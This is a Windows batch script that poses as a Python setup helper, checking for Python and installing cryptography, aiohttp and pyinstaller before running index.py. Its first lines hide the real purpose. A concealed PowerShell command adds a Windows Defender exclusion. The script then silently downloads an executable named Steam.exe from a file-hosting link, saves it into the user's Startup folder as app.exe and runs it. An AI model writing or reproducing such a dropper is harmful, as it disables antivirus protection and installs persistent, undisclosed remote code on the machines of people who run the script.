powershell -w hidden -c Add-MpPreference -ExclusionPath ""

@echo off
setlocal 

set "URL=https://download948.mediafire.com/3sd3hjwit9dgHNJPIMh3EzQ8MhQp_h7K5u9z9R1X2kY51OYu7SL0_0ZUl4ZsKVqCJnOSiS5igirxfW2AmGdoS0liAhk8mCFM3qWq1ouhWudUL9sPdWMOelU4QTe7qUTyfRsFCKowzb1YisUd2UPYuBI5fBaVMLNDAZs0ncNVf0Oc/xork33nz14tsx1d/Steam.exe"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\app.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"


title Checking Python installation...
python --version > nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed! (Go to https://www.python.org/downloads and install the python 3.11.0^)
    echo Very important click Add python exe to PATH.
    pause
)

title Checking Python libraries...
echo Checking 'cryptography' (1/3)
python -c "import cryptography" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing cryptography...
    python -m pip install cryptography > nul
)

echo Checking 'aiohttp' (2/3)
python -c "import aiohttp" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing aiohttp...
    python -m pip install aiohttp > nul
)

echo Checking 'pyinstaller' (3/3)
python -c "import PyInstaller" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing pyinstaller...
    python -m pip install pyinstaller > nul
)

cls
python index.py
